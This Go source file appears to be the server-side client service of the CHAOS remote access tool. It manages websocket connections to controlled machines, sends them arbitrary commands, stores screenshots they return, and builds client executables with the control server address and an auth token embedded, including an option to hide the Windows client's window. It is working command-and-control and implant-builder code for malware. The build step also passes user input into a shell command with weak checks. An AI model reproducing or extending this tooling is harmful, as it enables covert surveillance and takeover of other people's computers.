package client

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/image"
	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"net"
	"net/url"
	"os/exec"
	"regexp"
	"strings"
	"sync"
)

type clientService struct {
	AppVersion    string
	Clients       map[string]*websocket.Conn
	Mu            *sync.Mutex
	configuration *environment.Configuration
	Repository    authRepo.Repository
	AuthService   auth.Service
}

func NewClientService(
	appVersion string,
	configuration *environment.Configuration,
	repository authRepo.Repository,
	authService auth.Service,
) Service {
	return &clientService{
		AppVersion:    appVersion,
		configuration: configuration,
		Clients:       make(map[string]*websocket.Conn, 0),
		Mu:            &sync.Mutex{},
		Repository:    repository,
		AuthService:   authService,
	}
}

func (c clientService) GetConnection(clientID string) (*websocket.Conn, bool) {
	c.Mu.Lock()
	conn, found := c.Clients[clientID]
	c.Mu.Unlock()
	return conn, found
}

func (c clientService) RemoveConnection(clientID string) error {
	c.Mu.Lock()
	delete(c.Clients, clientID)
	c.Mu.Unlock()
	return nil
}

func (c clientService) AddConnection(clientID string, connection *websocket.Conn) error {
	c.Mu.Lock()
	c.Clients[clientID] = connection
	c.Mu.Unlock()
	return nil
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	client, found := c.GetConnection(input.ClientID)
	if !found {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	command := &entities.Command{
		Command:   input.Command,
		Parameter: input.Parameter,
	}

	req, err := json.Marshal(command)
	if err != nil {
		return SendCommandOutput{}, err
	}

	err = client.WriteMessage(websocket.BinaryMessage, req)
	if err != nil {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	_, readMessage, err := client.ReadMessage()
	if err != nil {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	var response request.RespondCommandRequestBody
	if err := json.Unmarshal(readMessage, &response); err != nil {
		return SendCommandOutput{}, err
	}

	command.Response = response.Response
	command.HasError = response.HasError

	command, err = handleResponse(command)
	if err != nil {
		return SendCommandOutput{}, err
	}

	res := utils.ByteToString(command.Response)
	if command.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: internal.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func handleResponse(payload *entities.Command) (*entities.Command, error) {
	switch payload.Command {
	case "screenshot":
		filepath, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utils.StringToByte(filepath)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	if !isValidIPAddress(input.ServerAddress) && !isValidURL(input.ServerAddress) {
		return "", internal.ErrInvalidServerAddress
	}
	if !isValidPort(input.ServerPort) {
		return "", internal.ErrInvalidServerPort
	}

	filename, err := utils.NormalizeString(input.Filename)
	if err != nil {
		return "", err
	}

	newToken, err := c.GenerateNewToken()
	if err != nil {
		return "", err
	}

	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.Port=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`

	filename = buildFilename(input.OSTarget, filename)
	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, filename)

	cmd := exec.Command("sh", "-c", buildCmd)
	cmd.Dir = "client/"

	outputErr, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%w:%s", err, outputErr)
	}
	return filename, nil
}

func isValidIPAddress(s string) bool {
	return net.ParseIP(s) != nil
}

func isValidURL(s string) bool {
	if _, err := url.ParseRequestURI(s); err != nil {
		return false
	}
	return true
}

func isValidPort(port string) bool {
	match, err := regexp.MatchString("^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$", port)
	return match && err == nil
}

func (c clientService) GenerateNewToken() (string, error) {
	config, err := c.AuthService.GetAuthConfig()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
}

func handleOSType(osType system.OSType) string {
	switch osType {
	case system.Windows:
		return "windows"
	case system.Linux:
		return "linux"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func buildFilename(os system.OSType, filename string) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = uuid.New().String()
	}
	switch os {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}
